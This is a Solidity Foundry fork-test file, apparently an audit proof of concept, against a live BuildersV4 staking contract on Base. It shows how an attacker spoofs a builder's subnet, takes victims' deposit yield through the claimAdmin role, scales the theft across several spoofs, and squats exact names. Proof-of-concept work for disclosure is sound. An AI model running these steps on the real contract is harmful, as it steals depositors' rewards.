// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20M {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

struct Subnet {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

struct UserData {
    uint128 lastDeposit;
    uint128 unused1;
    uint256 deposited;
    uint256 unused2;
}

interface IBuildersV4G5 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function editSubnetMetadata(bytes32 subnetId_, SubnetMetadata calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (string memory, address, uint128, uint128, uint128, uint256, address);
    function usersData(address user_, bytes32 subnetId_) external view returns (UserData memory);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
}

/// @title Gap G5-A — chaining sweep: G1-V1 (spoofed admin) x D2-1 (admin freeze) and self-compositions
/// @notice Fork tests on Base block 56038769. Attacker = fresh unprivileged
///         address; no owner/admin/multisig prank anywhere. The legit
///         builders are never pranked as callers except where the test
///         explicitly creates their own real subnet.
contract PocG5aChainTest is Test {
    uint256 constant BASE_BLOCK = 56038769;
    address constant BUILDERS_V4 = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    uint256 constant MIN_LOCK = 604800; // 7 days, live minimalWithdrawLockPeriod

    address attacker;
    address legit;
    address legit2;
    address legit3;
    address victim1;
    address victim2;
    address victim3;

    function setUp() public {
        vm.createSelectFork("base", BASE_BLOCK);
        attacker = makeAddr("attacker");
        legit = makeAddr("legitBuilder");
        legit2 = makeAddr("legitBuilder2");
        legit3 = makeAddr("legitBuilder3");
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        victim3 = makeAddr("victim3");
        vm.deal(attacker, 10 ether);
        vm.deal(legit, 10 ether);
        vm.deal(legit2, 10 ether);
        vm.deal(legit3, 10 ether);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.deal(victim3, 10 ether);
        deal(MOR, attacker, 500_000 ether);
        deal(MOR, legit, 500_000 ether);
        deal(MOR, legit2, 500_000 ether);
        deal(MOR, legit3, 500_000 ether);
        deal(MOR, victim1, 500_000 ether);
        deal(MOR, victim2, 500_000 ether);
        deal(MOR, victim3, 500_000 ether);
    }

    function _mkSubnet(string memory name, address admin, address claimAdmin, uint256 lock)
        internal
        pure
        returns (Subnet memory)
    {
        return
            Subnet({
                name: name,
                admin: admin,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: uint128(lock),
                unused2: 0,
                minimalDeposit: 1 ether,
                claimAdmin: claimAdmin
            });
    }

    function _mkMeta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata({slug: "g5", description: "g5", website: "https://example.com", image: ""});
    }

    function _create(string memory name, address admin, address claimAdmin, uint256 lock, address caller)
        internal
        returns (bytes32 id)
    {
        id = IBuildersV4G5(BUILDERS_V4).getSubnetId(name);
        vm.prank(caller);
        IBuildersV4G5(BUILDERS_V4).createSubnet(_mkSubnet(name, admin, claimAdmin, lock), _mkMeta());
    }

    function _deposit(address who, bytes32 id, uint256 amount) internal {
        vm.prank(who);
        IERC20M(MOR).approve(BUILDERS_V4, amount);
        vm.prank(who);
        IBuildersV4G5(BUILDERS_V4).deposit(id, amount);
    }

    function _withdraw(address who, bytes32 id, uint256 amount) internal {
        vm.prank(who);
        IBuildersV4G5(BUILDERS_V4).withdraw(id, amount);
    }

    /// @dev Attacker claims as claimAdmin; returns the MOR received.
    function _claimAsAttacker(bytes32 id) internal returns (uint256 received) {
        uint256 before = IERC20M(MOR).balanceOf(attacker);
        vm.prank(attacker);
        IBuildersV4G5(BUILDERS_V4).claim(id, attacker);
        received = IERC20M(MOR).balanceOf(attacker) - before;
        assertGt(received, 0, "claim must pay out");
    }

    function _subnetAdmin(bytes32 id) internal view returns (address admin, address claimAdmin, uint128 lock) {
        (, admin, , lock, , , claimAdmin) = IBuildersV4G5(BUILDERS_V4).subnets(id);
    }

    function _spoofWithVictims(string memory name) internal returns (bytes32 spoofId) {
        spoofId = _create(name, legit, attacker, MIN_LOCK, attacker);
        _deposit(victim1, spoofId, 50_000 ether);
        _deposit(victim2, spoofId, 30_000 ether);
        _deposit(victim3, spoofId, 20_000 ether);
    }

    // ------------------------------------------------------------------
    // Chain (1) Spoof + freeze: can the attacker, holding only the
    // claimAdmin role on the spoof, freeze victims' principal (D2-1
    // composed onto G1-V1)? DEAD — editSubnet is admin-gated and the
    // attacker is not the admin. Victims withdraw in full after the lock.
    // ------------------------------------------------------------------
    function test_G5_SpoofCannotFreeze_Dead() public {
        bytes32 spoofId = _spoofWithVictims("RealBuilderPro");

        // Attacker (claimAdmin only) cannot raise the lock...
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        IBuildersV4G5(BUILDERS_V4).editSubnet(
            spoofId, _mkSubnet("RealBuilderPro", legit, attacker, uint256(type(uint128).max) / 2)
        );
        // ...cannot change minimalDeposit to trap partial withdrawals...
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        Subnet memory edited = _mkSubnet("RealBuilderPro", legit, attacker, MIN_LOCK);
        edited.minimalDeposit = 50_000 ether;
        IBuildersV4G5(BUILDERS_V4).editSubnet(spoofId, edited);
        // ...and cannot touch the metadata either.
        vm.prank(attacker);
        vm.expectRevert("BU: not the Subnet owner");
        IBuildersV4G5(BUILDERS_V4).editSubnetMetadata(spoofId, _mkMeta());

        // The lock is unchanged, and victims withdraw their full principal
        // once the 7-day lock passes. No principal trap from the spoof role.
        (, , uint128 lockAfter) = _subnetAdmin(spoofId);
        assertEq(uint256(lockAfter), MIN_LOCK);
        vm.warp(block.timestamp + 8 days);
        _withdraw(victim1, spoofId, 50_000 ether);
        _withdraw(victim2, spoofId, 30_000 ether);
        _withdraw(victim3, spoofId, 20_000 ether);
        assertEq(IERC20M(MOR).balanceOf(victim1), 500_000 ether);
        assertEq(IERC20M(MOR).balanceOf(victim2), 500_000 ether);
        assertEq(IERC20M(MOR).balanceOf(victim3), 500_000 ether);
    }

    // ------------------------------------------------------------------
    // Chain (2) Spoof + claim loop: claim() has no timelock/cooldown, so
    // the attacker can drain continuously as yield accrues instead of
    // waiting 30 days. PROVEN as a mechanism — compare the loop total
    // with the single-claim control below.
    // ------------------------------------------------------------------
    function test_G5_ClaimLoop_ContinuousDrain() public {
        bytes32 spoofId = _spoofWithVictims("RealBuilderPro");
        uint256 total;
        vm.warp(block.timestamp + 10 days);
        total += _claimAsAttacker(spoofId);
        vm.warp(block.timestamp + 10 days);
        total += _claimAsAttacker(spoofId);
        vm.warp(block.timestamp + 10 days);
        total += _claimAsAttacker(spoofId);
        // The legit builder received nothing at any point.
        assertEq(IERC20M(MOR).balanceOf(legit), 500_000 ether);
        emit log_named_uint("claim-loop total stolen MOR (wei)", total);
        assertGt(total, 2_000 ether);
    }

    // Control for chain (2): identical setup, one claim at day 30.
    function test_G5_ClaimLoop_ControlSingleClaim() public {
        bytes32 spoofId = _spoofWithVictims("RealBuilderPro");
        vm.warp(block.timestamp + 30 days);
        uint256 stolen = _claimAsAttacker(spoofId);
        assertEq(IERC20M(MOR).balanceOf(legit), 500_000 ether);
        emit log_named_uint("single-claim stolen MOR (wei)", stolen);
        assertGt(stolen, 2_000 ether);
    }

    // ------------------------------------------------------------------
    // Chain (3) Self-deposit traction-faking: attacker deposits 100k of
    // their own MOR into the spoof to inflate its TVL. Victim-attributable
    // theft is the pro-rata half of the claim. DEAD as an upgrade: the
    // extra deposits dilute the shared rate, so the victim share is
    // SMALLER than in the victims-only control (~2,246 MOR).
    // ------------------------------------------------------------------
    function test_G5_SelfDeposit_DilutesVictimYield() public {
        bytes32 spoofId = _spoofWithVictims("RealBuilderPro");
        _deposit(attacker, spoofId, 100_000 ether); // attacker self-deposit
        vm.warp(block.timestamp + 30 days);
        uint256 claimed = _claimAsAttacker(spoofId);
        uint256 victimShare = claimed / 2; // victims supplied 100k of 200k staked
        emit log_named_uint("self-deposit world claimed total (wei)", claimed);
        emit log_named_uint("self-deposit world victim-attributable (wei)", victimShare);
        // Control (victims-only) steals ~2,246 MOR; dilution must push the
        // victim share below it. The attacker's own deposit earns yield too,
        // but that is yield on their own capital, not victim loss — and the
        // attacker can withdraw their 100k in full after the lock.
        assertLt(victimShare, 2_240 ether);
        vm.warp(block.timestamp + 8 days);
        _withdraw(attacker, spoofId, 100_000 ether);
        assertEq(IERC20M(MOR).balanceOf(attacker), 500_000 ether + claimed);
    }

    // ------------------------------------------------------------------
    // Chain (4) Multi-spoof scaling: 3 spoofs impersonating 3 builders,
    // 100k victim deposits each. PROVEN linear-ish scaling: total theft
    // is ~3x a single spoof, slightly sub-linear from rate dilution.
    // ------------------------------------------------------------------
    function test_G5_MultiSpoof_ScalesLinearly() public {
        bytes32 s1 = _create("G5BuilderAPro", legit, attacker, MIN_LOCK, attacker);
        bytes32 s2 = _create("G5BuilderBPro", legit2, attacker, MIN_LOCK, attacker);
        bytes32 s3 = _create("G5BuilderCPro", legit3, attacker, MIN_LOCK, attacker);
        _deposit(victim1, s1, 100_000 ether);
        _deposit(victim2, s2, 100_000 ether);
        _deposit(victim3, s3, 100_000 ether);
        vm.warp(block.timestamp + 30 days);
        uint256 total = _claimAsAttacker(s1) + _claimAsAttacker(s2) + _claimAsAttacker(s3);
        emit log_named_uint("multi-spoof total stolen MOR (wei)", total);
        assertGt(total, 5_000 ether);
        assertLt(total, 3 * 2_247 ether); // sub-linear: shared-rate dilution
        // Each spoof's admin still reads as its own legit builder.
        (address a1, , ) = _subnetAdmin(s1);
        (address a2, , ) = _subnetAdmin(s2);
        (address a3, , ) = _subnetAdmin(s3);
        assertEq(a1, legit);
        assertEq(a2, legit2);
        assertEq(a3, legit3);
        assertEq(IERC20M(MOR).balanceOf(legit), 500_000 ether);
        assertEq(IERC20M(MOR).balanceOf(legit2), 500_000 ether);
        assertEq(IERC20M(MOR).balanceOf(legit3), 500_000 ether);
    }

    // ------------------------------------------------------------------
    // Chain (5) Exact-name squat: a builder who has NOT created their
    // subnet yet can be squatted under their EXACT name — no lookalike
    // tell at all — and is then permanently locked out of it.
    // PROVEN: strictly stronger lure than G1-V1's lookalike name, same
    // loss magnitude per deposits.
    // ------------------------------------------------------------------
    function test_G5_ExactNameSquat_LocksOutLegit() public {
        bytes32 id = IBuildersV4G5(BUILDERS_V4).getSubnetId("G5NewBuilder");
        (address adminBefore, , ) = _subnetAdmin(id);
        assertEq(adminBefore, address(0), "name must be unclaimed at the fork");

        bytes32 spoofId = _create("G5NewBuilder", legit, attacker, MIN_LOCK, attacker);
        assertEq(spoofId, id);
        _deposit(victim1, spoofId, 50_000 ether);
        _deposit(victim2, spoofId, 30_000 ether);
        _deposit(victim3, spoofId, 20_000 ether);

        vm.warp(block.timestamp + 30 days);
        uint256 stolen = _claimAsAttacker(spoofId);
        emit log_named_uint("exact-name squat stolen MOR (wei)", stolen);
        assertGt(stolen, 1_000 ether);

        // The legit builder can NEVER create their own canonical subnet:
        // the exact name (and its old-style id) is taken forever.
        vm.prank(legit);
        vm.expectRevert("BU: the Subnet already exist (1)");
        IBuildersV4G5(BUILDERS_V4).createSubnet(_mkSubnet("G5NewBuilder", legit, legit, MIN_LOCK), _mkMeta());

        // Zero distinguishing signal: name AND admin both read as the legit.
        (address adminAfter, address claimAfter, ) = _subnetAdmin(spoofId);
        assertEq(adminAfter, legit);
        assertEq(claimAfter, attacker);
        assertEq(IERC20M(MOR).balanceOf(legit), 500_000 ether);
    }
}
